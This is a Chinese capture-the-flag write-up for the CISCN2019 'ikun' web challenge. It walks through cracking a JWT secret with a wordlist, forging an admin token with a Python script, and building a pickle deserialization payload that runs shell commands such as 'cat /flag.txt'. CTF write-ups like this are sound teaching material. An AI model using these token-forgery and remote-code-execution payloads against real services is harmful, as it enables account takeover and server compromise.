# [CISCN2019 华北赛区 Day1 Web2]ikun

## 知识点

`JWT`

`pickle`

## 解题

进入题目首页

![1Kun 1](./img/16-1.png?lastModify=1708305010)

要求冲到`lv6`

翻了几页没看见，用`python`脚本找一下

```python
import requests

for i in range(1, 200):
    url = f"http://84eb6b56-3cf8-4b61-91fd-02bd6f875a03.node5.buuoj.cn:81/shop?page={i}"
    resp = requests.get(url)
    print(i, flush=True)
    if 'lv6.png' in resp.text:
        print(f"find -> {i}")
        break
```

运行结果为`180`

![1Kun 2](./img/16-2.png?lastModify=1708305010)

发现了`lv6`的购买链接，`burpsuite`抓包看看

![1Kun 3](./img/16-3.png?lastModify=1708305010)

发现下面的`discount`即为折扣值

修改成功跳转后发现要求`admin`才能登录

发现`JWT`有签名，尝试破解一下

使用`jwt_tool`的字典破解

```bash
python3 .\jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImNjYyJ9.J2bFVzLD9m-41Jq8Z4J-FAB-8Kx04DqrvTcxQM521O4 -C -d .\top19576.txt
```

![Alt text](./img/16-6.png?lastModify=1708305010)

得到`secret`为`1Kun`

或者使用`jwtcrack`获取`secret`

![Alt text](./img/16-8.png?lastModify=1708305010)

`Cyberchef`解密结果

![Alt text](./img/16-7.png?lastModify=1708305010)

使用`python`生成`jwt`

```python
# coding=utf-8
import hmac
import hashlib
import base64

key = '1Kun'

header = '{"alg": "HS256","typ": "JWT"}'
payload = '{"username": "admin"}'

encodeHBytes = base64.urlsafe_b64encode(header.encode("utf-8"))
encodeHeader = str(encodeHBytes, "utf-8").rstrip("=")

encodePBytes = base64.urlsafe_b64encode(payload.encode("utf-8"))
encodePayload = str(encodePBytes, "utf-8").rstrip("=")

token = (encodeHeader + "." + encodePayload)


sig = base64.urlsafe_b64encode(hmac.new(bytes(key, "UTF-8"), token.encode("utf-8"), hashlib.sha256).digest()).decode("UTF-8").rstrip("=")

print(token + "." + sig)
```

运行结果为`eyJhbGciOiAiSFMyNTYiLCJ0eXAiOiAiSldUIn0.eyJ1c2VybmFtZSI6ICJhZG1pbiJ9.iRc4KyWA0et3DmhK0nFu7aznKWxX6KuXJhisec_QUtY`

放入`Cookie`中可以发现用户名已经变为`admin`

![Alt text](./img/16-9.png?lastModify=1708305010)

再到`burpsuite`中进行购买`lv6`

购买的时候发现了隐藏信息

![Alt text](./img/16-11.png?lastModify=1708305010)

在下载的文件里发现了`pickle`反序列化，那么就可以利用`pickle`反序列化执行命令了

![Alt text](./img/16-12.png?lastModify=1708305010)

```python
import pickle
import urllib
import commands

class A(object):
    def __reduce__(self):
      # return (eval, ("__import__('os').system('ls')",))


        # return (commands.getoutput, ("ls /",))
        return (commands.getoutput, ("cat /flag.txt",))
 
a = A()
s = pickle.dumps(a)
print(urllib.quote(s))
```

`python2`运行后为

```
ccommands%0Agetoutput%0Ap0%0A%28S%27cat%20/flag.txt%27%0Ap1%0Atp2%0ARp3%0A.
```

![pickle](./img/16-13.png?lastModify=1708305010)

放到`burpsuite`的`become`参数即可

![pickle](./img/16-14.png?lastModify=1708305010)

